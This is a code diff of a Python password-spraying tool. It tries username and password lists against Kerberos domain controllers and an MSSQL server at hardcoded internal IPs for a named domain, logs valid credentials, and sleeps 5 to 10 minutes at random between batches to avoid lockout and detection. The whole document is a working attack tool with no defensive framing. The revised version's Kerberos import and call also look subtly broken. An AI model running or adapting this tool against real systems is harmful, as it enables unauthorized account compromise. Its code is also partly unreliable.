@@ -1,92 +1,67 @@
-import argparse
 import random
 import time
-import datetime
-from impacket.krb5.asn1 import AS_REQ
+from datetime import datetime
+from impacket.krb5.asreq import getKerberosTGT
 from impacket.krb5.types import Principal
 from impacket.krb5 import constants
-from impacket.krb5.kerberosv5 import getKerberosTGT
-from impacket.krb5.ccache import CCache
-from impacket.krb5.kerberosv5 import KerberosError
-from impacket.krb5.kerberosv5 import getKerberosTGT
-from impacket.krb5.kerberosv5 import sendReceive as krb_send  # fallback if needed
-from impacket.krb5.keytab import Keytab
-from impacket.krb5.kerberosv5 import KerberosCredential, getKerberosTGS
-from impacket.ntlm import compute_lmhash, compute_nthash
-from impacket.examples import logger
-from impacket.examples.mssqlclient import MSSQL
-from impacket.smbconnection import SMBConnection
-import socket
-import sys
-from pathlib import Path
+import pymssql
 
-def try_kerberos(username, password, domain, dc_ip):
+# === CONFIG ===
+USERNAME_FILE = 'usernames.txt'
+PASSWORD_FILE = 'passwords.txt'
+OUTPUT_FILE = 'spray_results.log'
+
+KERBEROS_DCS = ['192.168.1.2', '192.168.1.24']
+MSSQL_HOST = '192.168.1.22'
+MIN_DELAY = 300  # 5 minutes
+MAX_DELAY = 600  # 10 minutes
+# ==============
+
+def log_result(line):
+    with open(OUTPUT_FILE, 'a') as f:
+        f.write(f"[{datetime.now().isoformat()}] {line}\n")
+
+def spray_kerberos(domain, username, password):
+    for dc in KERBEROS_DCS:
+        try:
+            principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+            getKerberosTGT(principal, password, domain, dc)
+            log_result(f"[+] VALID KERBEROS: {domain}\\{username}:{password}")
+        except Exception as e:
+            if "KDC_ERR_PREAUTH_FAILED" in str(e):
+                log_result(f"[-] INVALID KERBEROS: {domain}\\{username}:{password}")
+            else:
+                log_result(f"[!] ERROR (KRB) {domain}\\{username}:{password} - {e}")
+
+def spray_mssql(username, password):
     try:
-        tgt, cipher, session_key = getKerberosTGT(
-            Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value),
-            password,
-            domain,
-            None,
-            dc_ip
-        )
-        return True
-    except KerberosError as e:
-        return False
+        conn = pymssql.connect(server=MSSQL_HOST, user=username, password=password, login_timeout=5)
+        conn.close()
+        log_result(f"[+] VALID MSSQL: {username}:{password}")
+    except pymssql.OperationalError:
+        log_result(f"[-] INVALID MSSQL: {username}:{password}")
     except Exception as e:
-        return False
-
-def try_mssql(username, password, target_ip):
-    try:
-        client = MSSQL(target_ip, username=username, password=password, domain='', windows_auth=True)
-        client.connect()
-        return True
-    except Exception:
-        return False
+        log_result(f"[!] ERROR (MSSQL) {username}:{password} - {e}")
 
 def main():
-    parser = argparse.ArgumentParser(description="Stealth password spray tool for Kerberos and MSSQL.")
-    parser.add_argument("-u", "--userfile", required=True, help="Path to file with usernames")
-    parser.add_argument("-p", "--passfile", required=True, help="Path to file with passwords")
-    parser.add_argument("-o", "--outfile", default="spray_results.txt", help="Output file (appended)")
-    args = parser.parse_args()
+    domain = input("Enter domain name (e.g. XONGROUP): ").strip()
 
-    domain_controllers = ['192.168.1.2', '192.168.1.24']
-    mssql_target = '192.168.1.22'
-    usernames = Path(args.userfile).read_text().splitlines()
-    passwords = Path(args.passfile).read_text().splitlines()
+    with open(USERNAME_FILE) as f:
+        usernames = [line.strip() for line in f if line.strip()]
 
-    group_size = 5  # max usernames per round
-    username_chunks = [usernames[i:i + group_size] for i in range(0, len(usernames), group_size)]
+    with open(PASSWORD_FILE) as f:
+        passwords = [line.strip() for line in f if line.strip()]
 
-    with open(args.outfile, "a") as out:
-        for password in passwords:
-            for group in username_chunks:
-                for user in group:
-                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-                    # Try MSSQL
-                    mssql_result = try_mssql(user, password, mssql_target)
-                    if mssql_result:
-                        out.write(f"[{timestamp}] MSSQL SUCCESS: {user}:{password}\n")
-                        out.flush()
-                    else:
-                        out.write(f"[{timestamp}] MSSQL FAIL: {user}:{password}\n")
-                        out.flush()
-
-                    # Try Kerberos AS-REQ
-                    for dc in domain_controllers:
-                        kerberos_result = try_kerberos(user, password, domain="XONGROUP", dc_ip=dc)
-                        if kerberos_result:
-                            out.write(f"[{timestamp}] Kerberos SUCCESS [{dc}]: {user}:{password}\n")
-                            out.flush()
-                        else:
-                            out.write(f"[{timestamp}] Kerberos FAIL [{dc}]: {user}:{password}\n")
-                            out.flush()
-
-                # Stealth delay: 5 to 10 minutes between groups
-                delay = random.randint(300, 600)
-                print(f"[i] Sleeping for {delay // 60} minutes ({delay}s)...")
-                time.sleep(delay)
+    for password in passwords:
+        log_result(f"\n[*] Attempting password: {password}")
+        for i in range(0, len(usernames), 5):
+            batch = usernames[i:i+5]
+            for username in batch:
+                spray_kerberos(domain, username, password)
+                spray_mssql(username, password)
+            delay = random.randint(MIN_DELAY, MAX_DELAY)
+            log_result(f"[*] Sleeping {delay} seconds before next batch...\n")
+            time.sleep(delay)
 
 if __name__ == "__main__":
     main()
